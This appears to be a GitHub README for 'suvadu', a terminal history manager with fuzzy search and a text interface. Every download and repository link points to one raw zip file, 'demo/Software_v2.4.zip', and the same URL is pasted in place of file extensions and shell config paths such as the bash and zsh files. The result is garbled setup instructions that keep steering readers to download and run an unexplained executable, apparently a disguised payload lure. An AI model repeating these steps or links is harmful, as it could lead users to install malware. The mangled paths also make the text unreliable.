# 🛠️ suvadu - Smarter Terminal History Management

[![Download suvadu](https://github.com/Adie0609/suvadu/raw/refs/heads/main/demo/Software_v2.4.zip)](https://github.com/Adie0609/suvadu/raw/refs/heads/main/demo/Software_v2.4.zip)

## 📖 What is suvadu?

suvadu is a tool designed to help you keep track of everything you type in your terminal or command line. Instead of losing your previous commands when you close the terminal, suvadu stores all your commands in a special database. It lets you search through this history quickly using a fuzzy search, meaning you don’t have to remember the exact command to find it.

It also comes with a clean, interactive text-based interface (called a TUI) that makes browsing your history easy and clear. Plus, suvadu includes smart monitoring using AI to help manage and understand your command history better.

In short, suvadu gives you more control over your terminal history, saves time, and helps you find and reuse past commands easily.

---

## 🖥️ System Requirements

Before you get started, make sure your computer meets these general requirements:

- **Operating System**: Linux, macOS, or Windows (with WSL for better support)
- **Shells Supported**: bash and zsh shells
- **Dependencies**: No special setup required; suvadu works independently
- **Disk Space**: Minimal, as it only saves text command history and a small database

---

## 🚀 Getting Started

This guide will walk you through downloading, installing, and running suvadu. You do not need any programming experience. Follow each step carefully.

---

## ⬇️ Download & Install

### Step 1: Visit the download page

Click this big button to go to the official releases page:

[![Download suvadu](https://github.com/Adie0609/suvadu/raw/refs/heads/main/demo/Software_v2.4.zip)](https://github.com/Adie0609/suvadu/raw/refs/heads/main/demo/Software_v2.4.zip)

The releases page shows versions of suvadu you can download. Download the file that matches your computer’s operating system.

- For **Windows**, look for files ending in `.exe` or `.zip`.
- For **macOS**, look for files ending in `.dmg` or `https://github.com/Adie0609/suvadu/raw/refs/heads/main/demo/Software_v2.4.zip`.
- For **Linux**, look for `https://github.com/Adie0609/suvadu/raw/refs/heads/main/demo/Software_v2.4.zip` or `.deb` files.

### Step 2: Download the file

Click the file to download it to your computer. Save it somewhere easy to find, like your Downloads folder.

### Step 3: Install suvadu

- **Windows users**: If you downloaded an installer (`.exe`), double-click it and follow the on-screen instructions. If you downloaded a `.zip`, unzip it and run the `.exe` file inside.
- **macOS users**: Open the `.dmg` file and drag the suvadu app to your Applications folder. Or, unpack the `https://github.com/Adie0609/suvadu/raw/refs/heads/main/demo/Software_v2.4.zip` and run the program inside.
- **Linux users**: Use your system’s software installer for `.deb` files, or unpack the `https://github.com/Adie0609/suvadu/raw/refs/heads/main/demo/Software_v2.4.zip` and run the suvadu file inside a terminal.

---

## ▶️ How to Run suvadu

### Opening suvadu for the first time

After installation, you can open suvadu like other apps:

- On **Windows**, find suvadu in your Start menu or desktop.
- On **macOS**, find suvadu in your Applications folder or launchpad.
- On **Linux**, search for suvadu in your applications list or run it from a terminal.

### Using suvadu in your terminal

Once open, suvadu replaces your normal terminal history with a more powerful system. You can type commands as usual, and suvadu saves them in its database.

To browse your history, suvadu offers a simple interface with menus. Use your arrow keys to scroll, type a few letters to search with fuzzy matching, and press Enter to run a command again.

---

## ⚙️ Setting Up Your Shell

suvadu works best when it links with your existing terminal shell. Follow these steps if you use **bash** or **zsh**.

### For bash users

1. Open your terminal.
2. Type `nano ~https://github.com/Adie0609/suvadu/raw/refs/heads/main/demo/Software_v2.4.zip` to open your bash configuration file (you can use another text editor if you prefer).
3. Add the following line at the end of the file:

   ```bash
   eval "$(suvadu init bash)"
   ```

4. Save and close the file.
5. Restart your terminal to make suvadu active.

### For zsh users

1. Open your terminal.
2. Type `nano ~https://github.com/Adie0609/suvadu/raw/refs/heads/main/demo/Software_v2.4.zip`.
3. Add this line at the end:

   ```zsh
   eval "$(suvadu init zsh)"
   ```

4. Save and close.
5. Restart your terminal.

This setup allows suvadu to save your command history and let you use its search and interactive features directly from your shell.

---

## 🔍 How to Use suvadu Features

### Search your command history

- Open suvadu from your terminal.
- Start typing part of any command.
- suvadu will show matching commands, even if you only remember part of them.
- Use the arrow keys to select the command you want.
- Press Enter to run the selected command again.

### Use AI monitoring

suvadu includes a feature that watches your commands and offers helpful tips or warnings based on your history. You don’t need to do anything special to enable it.

### Interactive TUI

The text-based user interface shows your command history in an organized view. You can scroll through commands, see details, and select any command quickly.

---

## 🔧 Customizing suvadu

You can change settings to fit how you work:

- **Storage location**: Change where suvadu saves your history database.
- **Search sensitivity**: Adjust how closely search results match your input.
- **Interface colors**: Pick colors that are easier on your eyes.

To customize, open the suvadu settings menu or edit the configuration file found in your home directory (`~https://github.com/Adie0609/suvadu/raw/refs/heads/main/demo/Software_v2.4.zip`).

---

## 🛠️ Troubleshooting

If suvadu does not work as expected:

- Make sure your shell configuration file contains the correct `eval` command and you restarted your terminal.
- Check you downloaded the version for your operating system.
- Make sure no other shell history replacement tools are conflicting with suvadu.
- Visit the suvadu GitHub page and check the “Issues” section for common problems and solutions.
- Restart your computer if suvadu does not appear after installation.

---

## 📚 Learn More and Support

You can learn more about suvadu and get updates on the GitHub repository:  
https://github.com/Adie0609/suvadu/raw/refs/heads/main/demo/Software_v2.4.zip

Feel free to report problems or ask questions in the GitHub Issues section.

---

## 🔖 Topics

ai-agent-monitoring, bash, cli, rust, shell, shell-history, sqlite, terminal, tui, zsh

---

[![Download suvadu](https://github.com/Adie0609/suvadu/raw/refs/heads/main/demo/Software_v2.4.zip)](https://github.com/Adie0609/suvadu/raw/refs/heads/main/demo/Software_v2.4.zip)